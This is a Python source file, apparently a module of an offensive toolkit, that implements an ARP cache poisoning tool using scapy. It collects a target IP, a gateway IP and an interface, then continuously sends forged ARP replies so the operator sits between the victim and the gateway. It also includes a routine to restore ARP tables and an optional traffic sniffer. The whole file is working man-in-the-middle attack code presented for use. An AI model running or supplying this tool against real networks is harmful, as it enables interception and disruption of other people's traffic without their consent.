import time
import threading
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress

class ARPSpoofing:
    description = "ARP cache poisoning and man-in-the-middle attacks"
    
    def __init__(self):
        self.console = Console()
        self.target_ip = None
        self.gateway_ip = None
        self.interface = None
        self.is_spoofing = False
        self.spoofing_thread = None
        
    def run(self):
        try:
            self.console.print(
                Panel.fit(
                    "[bold blue]Starting ARP Spoofing Attack[/bold blue]",
                    title="[bold white]ARP Spoofer[/bold white]"
                )
            )
            
            config = self._get_attack_config()
            self.target_ip = config['target_ip']
            self.gateway_ip = config['gateway_ip']
            self.interface = config['interface']
            
            self.console.print(
                Panel.fit(
                    f"[yellow]Target IP:[/yellow] {self.target_ip}\n"
                    f"[yellow]Gateway IP:[/yellow] {self.gateway_ip}\n"
                    f"[yellow]Interface:[/yellow] {self.interface}",
                    title="[bold yellow]Attack Configuration[/bold yellow]"
                )
            )
            
            if not self._confirm_attack():
                return
            
            self._start_arp_spoofing()
            
        except Exception as e:
            self.console.print(
                Panel.fit(
                    f"[bold red]ARP spoofing failed: {e}[/bold red]",
                    title="[bold red]Attack Failed[/bold red]"
                )
            )
    
    def _get_attack_config(self):
        self.console.print("\n[bold]ARP Spoofing Configuration[/bold]")
        
        target_ip = self.console.input("[cyan]Target IP address[/cyan]: ").strip()
        gateway_ip = self.console.input("[cyan]Gateway/Router IP[/cyan]: ").strip()
        interface = self.console.input("[cyan]Network interface[/cyan] (e.g., eth0): ").strip()
        
        return {
            'target_ip': target_ip,
            'gateway_ip': gateway_ip,
            'interface': interface
        }
    
    def _confirm_attack(self):
        confirm = self.console.input(
            "\n[bold red]WARNING: ARP spoofing will disrupt network traffic. Continue?[/bold red] (y/N): "
        ).strip().lower()
        return confirm == 'y'
    
    def _start_arp_spoofing(self):
        self.console.print("\n[bold]Starting ARP Cache Poisoning...[/bold]")
        
        # Get our MAC address
        our_mac = get_if_hwaddr(self.interface)
        
        self.console.print(f"[cyan]Our MAC address:[/cyan] {our_mac}")
        
        self.is_spoofing = True
        self.spoofing_thread = threading.Thread(target=self._spoof_loop, args=(our_mac,))
        self.spoofing_thread.daemon = True
        self.spoofing_thread.start()
        
        self.console.print(
            Panel.fit(
                "[green]ARP spoofing started. Press Ctrl+C to stop.[/green]",
                title="[bold green]Attack Running[/bold green]"
            )
        )
        
        try:
            while self.is_spoofing:
                time.sleep(1)
        except KeyboardInterrupt:
            self._stop_arp_spoofing()
    
    def _spoof_loop(self, our_mac):
        """Main ARP spoofing loop"""
        packet_count = 0
        
        while self.is_spoofing:
            try:
                # Tell the target that we are the gateway
                target_packet = Ether(dst=getmacbyip(self.target_ip)) / ARP(
                    op=2,  # ARP reply
                    psrc=self.gateway_ip,  # Pretend to be gateway
                    pdst=self.target_ip,   # Send to target
                    hwsrc=our_mac          # With our MAC
                )
                
                # Tell the gateway that we are the target
                gateway_packet = Ether(dst=getmacbyip(self.gateway_ip)) / ARP(
                    op=2,  # ARP reply
                    psrc=self.target_ip,   # Pretend to be target
                    pdst=self.gateway_ip,  # Send to gateway
                    hwsrc=our_mac          # With our MAC
                )
                
                # Send both packets
                sendp(target_packet, iface=self.interface, verbose=0)
                sendp(gateway_packet, iface=self.interface, verbose=0)
                
                packet_count += 2
                
                if packet_count % 20 == 0:  # Print status every 10 pairs
                    self.console.print(f"[dim]Sent {packet_count} ARP packets...[/dim]")
                
                time.sleep(2)  # Send every 2 seconds
                
            except Exception as e:
                self.console.print(f"[yellow]Error in spoofing loop: {e}[/yellow]")
                time.sleep(5)
    
    def _stop_arp_spoofing(self):
        """Stop ARP spoofing and restore ARP tables"""
        self.console.print("\n[bold yellow]Stopping ARP spoofing...[/bold yellow]")
        
        self.is_spoofing = False
        
        if self.spoofing_thread:
            self.spoofing_thread.join(timeout=5)
        
        self._restore_arp_tables()
        
        self.console.print(
            Panel.fit(
                "[green]ARP spoofing stopped. ARP tables restored.[/green]",
                title="[bold green]Attack Stopped[/bold green]"
            )
        )
    
    def _restore_arp_tables(self):
        """Send legitimate ARP packets to restore correct MAC mappings"""
        try:
            # Get real MAC addresses
            target_mac = getmacbyip(self.target_ip)
            gateway_mac = getmacbyip(self.gateway_ip)
            our_mac = get_if_hwaddr(self.interface)
            
            # Restore target's ARP table
            target_restore = Ether(dst=target_mac) / ARP(
                op=2,
                psrc=self.gateway_ip,
                hwsrc=gateway_mac,
                pdst=self.target_ip,
                hwdst=target_mac
            )
            
            # Restore gateway's ARP table  
            gateway_restore = Ether(dst=gateway_mac) / ARP(
                op=2,
                psrc=self.target_ip,
                hwsrc=target_mac,
                pdst=self.gateway_ip,
                hwdst=gateway_mac
            )
            
            # Send restore packets multiple times
            for _ in range(5):
                sendp(target_restore, iface=self.interface, verbose=0)
                sendp(gateway_restore, iface=self.interface, verbose=0)
                time.sleep(1)
                
        except Exception as e:
            self.console.print(f"[yellow]Error restoring ARP tables: {e}[/yellow]")
    
    def _sniff_traffic(self):
        """Optional: Sniff traffic while in MITM position"""
        self.console.print("\n[bold]Starting traffic sniffing...[/bold]")
        
        def packet_handler(packet):
            if packet.haslayer(IP):
                src = packet[IP].src
                dst = packet[IP].dst
                proto = packet[IP].proto
                
                self.console.print(f"[dim]IP: {src} -> {dst} Protocol: {proto}[/dim]")
        
        # Start sniffing in background
        sniff_thread = threading.Thread(
            target=lambda: sniff(
                iface=self.interface, 
                prn=packet_handler, 
                filter="ip",
                store=0
            )
        )
        sniff_thread.daemon = True
        sniff_thread.start()
